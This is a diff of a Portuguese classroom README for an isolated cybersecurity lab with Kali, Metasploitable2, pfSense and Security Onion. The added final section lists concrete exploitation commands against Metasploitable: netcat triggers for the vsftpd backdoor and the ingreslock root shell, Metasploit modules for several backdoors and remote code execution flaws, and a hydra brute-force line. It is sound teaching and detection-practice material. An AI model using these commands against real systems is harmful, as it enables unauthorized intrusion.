@@ -1,7 +1,10 @@
 # Laboratório de Redes: Ataque, Firewall e Detecção
 
-Um atacante, um alvo cheio de falhas, um firewall no meio e um SOC vigiando o cabo. As quatro peças ligadas de verdade, montadas no laboratório da escola.
+Um atacante, um alvo cheio de falhas, um firewall no meio e um SOC vigiando o cabo. As quatro peças ligadas de verdade, montadas no laboratório do SENAC.
 
+> 📎 Os slides completos desta aula estão em [`slides/`](./slides) (ou no link do Artifact, se você tiver acesso).
+
+Baseado no guia [*"The free cybersecurity home lab, plus the four things that make it count"*](https://certgames.com/blog/cybersecurity-home-lab-for-free), de Carter Perez (CertGames), adaptado para rodar no laboratório da sala.
 
 ---
 
@@ -15,12 +18,14 @@ O que falta montar são três peças: **Metasploitable2**, **pfSense** e **Secur
 
 ## As 4 peças
 
-| Peça | O que é | RAM |
-|---|---|---|
-| **Kali Linux** *(já instalado)* | O atacante. ~600 ferramentas; nmap e Metasploit são as duas para mexer primeiro. | 2 GB |
-| **Metasploitable2** | O alvo. Feito pela Rapid7 de propósito para ser quebrado. Um museu de jeitos de ser hackeado. | 512 MB |
-| **pfSense CE** | O firewall/roteador. Versão Community da Netgate, grátis. Duas placas de rede — a segunda é o ponto inteiro do exercício. | 1 GB |
-| **Security Onion** | O SOC. Suricata + Zeek + Elastic numa VM só. O que um analista fica olhando o dia todo. | 8 GB |
+| Peça | O que é | RAM | Disco |
+|---|---|---|---|
+| **Kali Linux** *(já instalado)* | O atacante. ~600 ferramentas; nmap e Metasploit são as duas para mexer primeiro. | 2 GB | *(já vem pronto)* |
+| **Metasploitable2** | O alvo. Feito pela Rapid7 de propósito para ser quebrado. Um museu de jeitos de ser hackeado. | 512 MB | ~8 GB *(disco já vem pronto no `.vmdk`, não precisa criar um novo)* |
+| **pfSense CE** | O firewall/roteador. Versão Community da Netgate, grátis. Duas placas de rede — a segunda é o ponto inteiro do exercício. | 1 GB | 8 GB *(disco novo, criado na hora)* |
+| **Security Onion** | O SOC. Suricata + Zeek + Elastic numa VM só. O que um analista fica olhando o dia todo. | 8 GB | **~200 GB** *(disco novo, dinamicamente alocado)* |
+
+> A soma de disco novo que você precisa criar é pouco mais de **200 GB** (praticamente tudo vem do Security Onion). Confira o espaço livre na máquina da sala antes de começar — como o disco é "dinamicamente alocado", ele só ocupa esse tanto aos poucos, conforme enche, não os 200 GB de uma vez.
 
 ### Metasploitable2 — as falhas específicas
 
@@ -37,12 +42,12 @@ Login: `msfadmin` / `msfadmin`.
 Toda placa de rede de uma VM tem um modo:
 
 - **NAT** — a VM sai para a internet através do seu computador.
-- **Bridged** — a VM se comporta como um aparelho físico dentro da rede real (no nosso caso, a rede da escola).
+- **Bridged** — a VM se comporta como um aparelho físico dentro da rede real (no nosso caso, a rede do SENAC).
 - **Internal Network** — a VM só fala com outras VMs na mesma rede interna nomeada. Nada de fora do computador enxerga isso.
 
 ### A regra de ouro
 
-**O Metasploitable nunca encosta em NAT ou Bridged. Nunca.** Ele tem um shell de root numa porta aberta, sem senha. Colocar isso em Bridged é expor esse shell direto na rede da escola. **Só Internal Network.**
+**O Metasploitable nunca encosta em NAT ou Bridged. Nunca.** Ele tem um shell de root numa porta aberta, sem senha. Colocar isso em Bridged é expor esse shell direto na rede do SENAC. **Só Internal Network.**
 
 ### O mapa completo
 
@@ -54,6 +59,45 @@ Toda placa de rede de uma VM tem um modo:
 | Security Onion | NAT (gestão) | Internal Network `lab`, sem IP, **Promiscuous Mode: Allow All** |
 
 Kali e Metasploitable ficam na mesma rede privada, com o pfSense como gateway. O Security Onion enxerga tudo porque a segunda placa está em modo promíscuo — **o checkbox que mais gente esquece**.
+
+```mermaid
+graph LR
+    INTERNET((Internet))
+
+    subgraph HOST["Computador da sala"]
+        subgraph NAT["VirtualBox NAT"]
+            direction TB
+            PFS_WAN["pfSense · Adapter 1"]
+            SO_MGMT["Security Onion · Adapter 1"]
+        end
+
+        subgraph LAB["Internal Network · lab"]
+            direction TB
+            KALI["Kali<br/>(atacante)"]
+            META["Metasploitable<br/>(alvo)"]
+            PFS_LAN["pfSense · Adapter 2<br/>(gateway/DHCP)"]
+            SO_MON["Security Onion · Adapter 2<br/>sem IP · Promiscuous: Allow All"]
+        end
+    end
+
+    INTERNET --- PFS_WAN
+    INTERNET --- SO_MGMT
+
+    KALI -->|nmap -sV| META
+    KALI --- PFS_LAN
+    META --- PFS_LAN
+    SO_MON -.->|escuta tudo| KALI
+    SO_MON -.->|escuta tudo| META
+
+    style KALI fill:#1c1710,stroke:#F2A65A,color:#eef2f0
+    style META fill:#1c1710,stroke:#F87171,color:#eef2f0
+    style PFS_LAN fill:#10151a,stroke:#6EE7A8,color:#eef2f0
+    style PFS_WAN fill:#10151a,stroke:#6EE7A8,color:#eef2f0
+    style SO_MON fill:#10151a,stroke:#93a1a8,color:#eef2f0
+    style SO_MGMT fill:#10151a,stroke:#93a1a8,color:#eef2f0
+```
+
+> O pfSense não está no caminho do ataque em si — Kali e Metasploitable estão no mesmo segmento `lab` e se enxergam direto. Quem detecta é o Security Onion, escutando essa mesma rede em modo promíscuo.
 
 ---
 
@@ -85,7 +129,7 @@ Kali e Metasploitable ficam na mesma rede privada, com o pfSense como gateway. O
 3. **Settings → Storage**: prenda o ISO. **Settings → Network**: Adapter 1 = **NAT**; aba Adapter 2: Enable, **Internal Network "lab"**.
 4. Clique em **Advanced** no Adapter 2 e mude **Promiscuous Mode para "Allow All"**. É o checkbox que quase todo mundo esquece.
 5. Boot → Install → tipo de instalação **EVAL** → primeira placa como gestão, segunda como interface de monitoramento.
-6. Deixe rodar (demora). No final, ele mostra um endereço web — abra no navegador do host, faça login e clique em **Alerts**.
+6. Deixe rodar (demora). No final, ele mostra um endereço web — mas **esse endereço não abre direto no navegador do computador da sala**, porque a placa de gestão está em NAT (rede privada só daquela VM). É preciso criar uma regra de **Port Forwarding** antes (Settings → Network → Adapter 1 → Advanced → Port Forwarding: porta do host `8443` → porta `443` da VM). Só depois disso `https://localhost:8443` abre o login — passo a passo completo no `CONFIGURACAO-DETALHADA.md`, seção 3.3.
 
 ---
 
@@ -145,3 +189,100 @@ Ache alguém que trabalha num SOC de verdade — LinkedIn, Discord, um evento, a
 ## Ressalva honesta
 
 O Metasploitable2 é de 2012. As falhas são antigas. Serve para entender como exploração funciona na prática — não mostra como é uma máquina moderna e corrigida. Está tudo bem para um primeiro laboratório. Só saiba o que é.
+
+---
+
+## Exemplos do que explorar no Metasploitable, pelo Kali
+
+Depois do `nmap -sV` inicial, aqui vão alvos concretos dentro do próprio Metasploitable — do mais simples ao mais elaborado. Todos funcionam só entre essas duas VMs, dentro da rede `lab`.
+
+### 1. Backdoor do vsftpd 2.3.4 — porta 21
+
+A versão do FTP instalada tem um backdoor plantado no próprio código: se o usuário digitado terminar com `:)`, o servidor abre um shell de root na porta 6200.
+
+```bash
+# no Kali
+nc <IP do Metasploitable> 21
+# o servidor responde com um banner. Digite o comando USER com um valor terminando em :) , ex:
+USER hacker:)
+# não precisa mandar PASS — o backdoor já abre. Em outro terminal:
+nc <IP do Metasploitable> 6200
+```
+
+Ou direto pelo Metasploit: `use exploit/unix/ftp/vsftpd_234_backdoor`.
+
+### 2. Backdoor do UnrealIRCd — porta 6667
+
+O servidor de IRC também vem com uma porta dos fundos.
+
+```bash
+msfconsole
+use exploit/unix/irc/unreal_ircd_3281_backdoor
+set RHOSTS <IP do Metasploitable>
+run
+```
+
+### 3. Shell de root sem senha — porta 1524 (ingreslock)
+
+O mais direto de todos: essa porta entrega um shell de root, sem pedir nada.
+
+```bash
+nc <IP do Metasploitable> 1524
+whoami
+# deve responder: root
+```
+
+### 4. Samba "usermap script" — porta 445
+
+Falha clássica de execução remota de comando via Samba.
+
+```bash
+msfconsole
+use exploit/multi/samba/usermap_script
+set RHOSTS <IP do Metasploitable>
+run
+```
+
+### 5. distccd — porta 3632
+
+O daemon do distcc (compilação distribuída) aceita comandos de qualquer um.
+
+```bash
+msfconsole
+use exploit/unix/misc/distcc_exec
+set RHOSTS <IP do Metasploitable>
+run
+```
+
+### 6. Java RMI Server — porta 1099
+
+```bash
+msfconsole
+use exploit/multi/misc/java_rmi_server
+set RHOSTS <IP do Metasploitable>
+run
+```
+
+### 7. Tomcat Manager — porta 8180
+
+Credenciais padrão (`tomcat` / `tomcat`) dão acesso ao painel de administração, de onde dá para subir um `.war` malicioso e ganhar shell.
+
+```bash
+msfconsole
+use exploit/multi/http/tomcat_mgr_deploy
+set RHOSTS <IP do Metasploitable>
+set RPORT 8180
+set HttpUsername tomcat
+set HttpPassword tomcat
+run
+```
+
+### 8. Força bruta em serviços com senha fraca
+
+Bom exercício para conectar com a aula de 21/09: rodar `hydra` ou `medusa` contra SSH, FTP ou MySQL do Metasploitable usando a wordlist `rockyou.txt`.
+
+```bash
+hydra -l msfadmin -P /usr/share/wordlists/rockyou.txt ssh://<IP do Metasploitable>
+```
+
+> Para cada um desses, vale a mesma regra do bloco "o que separa isso de mais um print no GitHub": não é só rodar o exploit e printar "consegui root" — é anotar o que o Security Onion detectou (ou não detectou) para cada ataque, e por quê.
